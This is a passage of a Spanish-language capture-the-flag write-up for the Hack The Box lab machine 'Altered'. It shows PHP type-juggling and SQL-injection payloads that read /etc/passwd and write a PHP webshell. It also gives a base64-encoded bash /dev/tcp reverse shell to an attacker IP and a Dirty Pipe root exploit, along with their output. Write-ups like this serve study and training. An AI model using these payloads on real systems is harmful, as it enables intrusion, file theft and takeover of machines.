+</span></span><span style="display:flex;"><span>Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season <span style="color:#a5d6ff">1</span> Tournament, there isn<span style="color:#f85149">&#39;</span>t much footage <span style="color:#ff7b72">for</span> others to study. The only thing players can gather about this guy is what is on his &lt;a <span style="color:#79c0ff">href</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;bigous.me&#34;</span>&gt;blog&lt;/a&gt; and that he can hack.
+</span></span></code></pre></div><p>Esto es relevante porque el formato JSON permite enviar <code>secret</code> con un tipo de dato distinto a texto. Si en lugar del hash real probamos <code>&quot;secret&quot;: true</code> (booleano), la petición también se procesa como válida:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#79c0ff">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Esto confirma un caso clásico de <strong>PHP Type Juggling</strong>: con el operador de comparación floja (<code>==</code>), PHP convierte el booleano <code>true</code> y cualquier string no vacío (ni <code>&quot;0&quot;</code>) al mismo tipo antes de compararlos, por lo que <code>true == &quot;&lt;hash&gt;&quot;</code> se evalúa como verdadero sin importar cuál sea el hash real. A partir de aquí ya no necesitamos conocer el <code>secret</code> correcto: basta con enviar <code>secret: true</code> en cada petición JSON —como se ve en los payloads de inyección SQL a continuación— para saltarnos por completo esa validación. Esto, sumado a que el filtro de inyección (que bloqueaba comillas simples en <code>application/x-www-form-urlencoded</code>) tampoco se aplica al cuerpo JSON —probablemente porque Laravel enruta cada formato a un parser distinto—, nos abre la puerta a inyectar SQL directamente sobre el parámetro <code>id</code>.</p>
+<h1 id="explotando-sql-injection">
+  Explotando SQL Injection
+  <a class="heading-link" href="#explotando-sql-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Ahora podemos probar a insertar un <code>order by</code> para ver si la web lo interpreta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;1&#39; order by 1--+-&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#a5d6ff">&#34;89cb389c73f667c5511ce169033089cb&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Y vemos que la web nos responde con:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;message&#34;</span>: <span style="color:#a5d6ff">&#34;Server Error&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Pero si quitamos la comilla simple <code>'</code> y el comentario <code>--+-</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;1 order by 1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#a5d6ff">&#34;89cb389c73f667c5511ce169033089cb&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Vemos que la web responde con normalidad:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">280</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season <span style="color:#a5d6ff">1</span> Tournament, there isn<span style="color:#f85149">&#39;</span>t much footage <span style="color:#ff7b72">for</span> others to study. The only thing players can gather about this guy is what is on his &lt;a <span style="color:#79c0ff">href</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;bigous.me&#34;</span>&gt;blog&lt;/a&gt; and that he can hack.
+</span></span></code></pre></div><p>De esta forma podemos descubrir que la consulta SQL detrás utiliza 3 columnas.</p>
+<p>Si probamos el siguiente payload, vemos que el valor <code>3</code> se refleja en la web, por lo cual lo podemos utilizar para exfiltrar información:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;100 union select 1,2,&#39;Celero0&#39;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#79c0ff">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Celero0
+</span></span></code></pre></div><h2 id="leer-archivos-mediante-sqli">
+  Leer archivos mediante SQLi
+  <a class="heading-link" href="#leer-archivos-mediante-sqli">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Dependiendo de los permisos que tenga el usuario de la base de datos, a veces podemos llegar a leer archivos de la máquina víctima. Para ello usamos la función <code>load_file('')</code>. Para leer <code>/etc/passwd</code>, aplicamos el siguiente payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;100 union select 1,2,load_file(&#39;/etc/passwd&#39;)&#34;</span>,<span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#79c0ff">true</span>}
+</span></span></code></pre></div><p>La web responde con lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">1816</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#ff7b72;font-weight:bold">(</span>admin<span style="color:#ff7b72;font-weight:bold">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>htb:x:1000:1000:htb:/home/htb:/bin/bash
+</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style="display:flex;"><span>mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
+</span></span></code></pre></div><p>Ahora leemos un archivo importante para obtener información de <code>nginx</code>, el archivo de configuración de sitios habilitados, con el siguiente payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;100 union select 1,2,load_file(&#39;/etc/nginx/sites-enabled/default&#39;)&#34;</span>,<span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#79c0ff">true</span>}
+</span></span></code></pre></div><p>Obtenemos como respuesta la ruta donde corre la web: <code>/srv/altered/public</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">865</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server <span style="color:#ff7b72;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>    listen <span style="color:#a5d6ff">80</span> default_server;
+</span></span><span style="display:flex;"><span>    listen <span style="color:#ff7b72;font-weight:bold">[</span>::<span style="color:#ff7b72;font-weight:bold">]</span>:80 default_server;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    root /srv/altered/public;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    add_header X-Frame-Options <span style="color:#a5d6ff">&#34;SAMEORIGIN&#34;</span>;
+</span></span><span style="display:flex;"><span>    add_header X-Content-Type-Options <span style="color:#a5d6ff">&#34;nosniff&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    set <span style="color:#79c0ff">$realip</span> <span style="color:#79c0ff">$remote_addr</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">$http_x_forwarded_for</span> ~ <span style="color:#a5d6ff">&#34;^(\d+\.\d+\.\d+\.\d+)&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        set <span style="color:#79c0ff">$realip</span> <span style="color:#79c0ff">$1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span></code></pre></div><h2 id="escribir-archivos-mediante-sqli">
+  Escribir archivos mediante SQLi
+  <a class="heading-link" href="#escribir-archivos-mediante-sqli">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Sabiendo la ruta donde se aloja la web, podemos intentar subir una webshell. Como vimos antes que la web usa Laravel, podemos inferir que por detrás se interpreta el lenguaje PHP, por lo cual el siguiente payload sube una webshell mediante <code>INTO OUTFILE</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#f85149">Content-Type:</span> <span style="color:#f85149">application/json</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">Content-Length:</span> <span style="color:#a5d6ff">89</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;100 union select &#39;1&#39;,&#39;2&#39;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39; into outfile &#39;/srv/altered/public/shell.php&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;secret&#34;</span>:<span style="color:#79c0ff">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>El mensaje de la web es un error, pero eso no necesariamente significa que el archivo no se haya subido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#7ee787">&#34;message&#34;</span>: <span style="color:#a5d6ff">&#34;Server Error&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Por lo cual verificamos con un simple <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a5d6ff">&#39;http://10.129.227.109/webshell.php?0=id&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span>,117<span style="color:#ff7b72;font-weight:bold">(</span>mysql<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>Ya con acceso a ejecución remota de comandos, podemos conseguir una reverse shell. Para ello nos ponemos en escucha con <code>penelope</code> en el puerto <code>4444</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>penelope <span style="color:#a5d6ff">4444</span>
+</span></span></code></pre></div><p>Y enviamos la reverse shell con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a5d6ff">&#39;http://10.129.227.109/webshell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDgvNDQ0NCAwPiYxKSAm|base64+-d|bash&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>New Reverse Shell<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">=</span>&gt; altered 10.129.227.109 Linux-x86_64 
+</span></span><span style="display:flex;"><span>www-data<span style="color:#ff7b72;font-weight:bold">(</span>33<span style="color:#ff7b72;font-weight:bold">)</span> Session ID &lt;1&gt;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Agent deployed via /usr/bin/python3
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Interacting with session <span style="color:#ff7b72;font-weight:bold">[</span>1<span style="color:#ff7b72;font-weight:bold">]</span> • PTY • Menu key F12 ⇐
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Session log: /home/celero0/.penelope/sessions/altered~10.129.227.109-Linux-x86_64/2026_10_29-23_18_41-880-www-data<span style="color:#ff7b72;font-weight:bold">(</span>33<span style="color:#ff7b72;font-weight:bold">)</span>.log
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>www-data@altered:/srv/altered/public$
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Ya con la consola, podemos ir a <code>/home/htb/</code> y leer <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@altered:~$ cd /home/htb/
+</span></span><span style="display:flex;"><span>www-data@altered:/home/htb$ cat user.txt 
+</span></span><span style="display:flex;"><span>81cfb4d3e5f2db0668220fb159ba6a1b
+</span></span></code></pre></div><p>Buscando vías para escalar privilegios, encontramos que el kernel de la máquina es vulnerable a <strong>Dirty Pipe</strong> (<code>CVE-2022-0847</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@altered:/home/htb$ uname -r
+</span></span><span style="display:flex;"><span>5.16.0-051600-generic
+</span></span></code></pre></div><p>Para explotarlo, descargamos el siguiente exploit en C:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/refs/heads/main/exploit.c
+</span></span></code></pre></div><p>Lo compilamos en nuestra máquina atacante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc exploit.c -o exploit
+</span></span></code></pre></div><p>Y lo transferimos a la máquina víctima para ejecutarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@altered:/tmp$ wget 10.10.14.48/exploit-2
+</span></span><span style="display:flex;"><span>--2026-10-30 04:01:26--  http://10.10.14.48/exploit-2
+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.48:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#a5d6ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#a5d6ff">18040</span> <span style="color:#ff7b72;font-weight:bold">(</span>18K<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>application/octet-stream<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘exploit-2’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exploit-2                                                  100%<span style="color:#ff7b72;font-weight:bold">[=======================================================================================================================================</span>&gt;<span style="color:#ff7b72;font-weight:bold">]</span>  17.62K   114KB/s    in 0.2s     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-10-30 04:01:27 <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">114</span> KB/s<span style="color:#ff7b72;font-weight:bold">)</span> - ‘exploit-2’ saved <span style="color:#ff7b72;font-weight:bold">[</span>18040/18040<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@altered:/tmp$ chmod +x exploit-2
+</span></span><span style="display:flex;"><span>www-data@altered:/tmp$ ./exploit-2
+</span></span><span style="display:flex;"><span>Usage: ./exploit-2 SUID
+</span></span><span style="display:flex;"><span>www-data@altered:/tmp$ ./exploit-2 /usr/bin/pkexec
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> hijacking suid binary..
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> dropping suid shell..
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> restoring suid binary..
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> popping root shell.. <span style="color:#ff7b72;font-weight:bold">(</span>dont forget to clean up /tmp/sh ;<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># id</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>,33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span>,117<span style="color:#ff7b72;font-weight:bold">(</span>mysql<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>El exploit abusa de <strong>Dirty Pipe</strong> para sobrescribir el contenido de un binario con permiso SUID (<code>pkexec</code>) en memoria sin modificar sus permisos en disco, inyectando un shellcode que al ejecutarse concede una shell con privilegios de <code>root</code>.</p>
+<p>Finalmente vamos a <code>/root</code> y leemos <code>root.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@altered:/tmp# cd /root/
+</span></span><span style="display:flex;"><span>root@altered:/root# cat root.txt 
+</span></span><span style="display:flex;"><span>619f436a829aba601cebb691790551a1
+</span></span></code></pre></div><h1 id="conclusión">
+  Conclusión
+  <a class="heading-link" href="#conclusi%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>En <strong>Altered</strong>, el punto de entrada no está en una falla evidente de la aplicación, sino en una cabecera de confianza mal gestionada: al confiar <code>X-Forwarded-For</code> como origen real del cliente para aplicar el rate limiting, es posible rotarla y forzar por fuerza bruta el PIN de <code>/api/resettoken</code> sin restricciones, hasta recuperar el acceso de <code>admin</code>.</p>
+<p>Desde ahí, un endpoint de perfiles (<code>/api/getprofile</code>) protegido por un parámetro <code>secret</code> resulta vulnerable a <strong>PHP Type Juggling</strong>: al enviarlo como booleano <code>true</code> dentro de una petición <code>application/json</code> en lugar de como cadena, la comparación floja (<code>==</code>) de PHP lo evalúa como verdadero frente a cualquier hash, saltándose por completo la validación —y, de paso, el filtro que bloqueaba caracteres de inyección SQL en el cuerpo <code>form-urlencoded</code>—. Esto habilita una inyección UNION-based sobre el parámetro <code>id</code>, con la que se lee <code>/etc/passwd</code> y la configuración de <code>nginx</code> mediante <code>load_file()</code>, y se escribe una webshell en <code>/srv/altered/public/shell.php</code> mediante <code>INTO OUTFILE</code>, logrando ejecución remota de comandos como <code>www-data</code>.</p>
+<p>Para la escalada a <code>root</code>, el kernel de la máquina (<code>5.16.0-051600-generic</code>) resulta vulnerable a <strong>Dirty Pipe</strong> (<code>CVE-2022-0847</code>); explotarlo sobre el binario SUID <code>pkexec</code> permite sobrescribir su contenido en memoria sin alterar sus permisos en disco, obteniendo una shell con privilegios de <code>root</code>.</p>
+<p>En resumen, la máquina pone a prueba el abuso de cabeceras de confianza para evadir controles de rate limiting, la explotación de fallas de comparación de tipos en PHP (Type Juggling) para romper controles de acceso, la inyección SQL para lectura y escritura arbitraria de archivos, y la explotación de una vulnerabilidad de kernel conocida para escalar privilegios.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
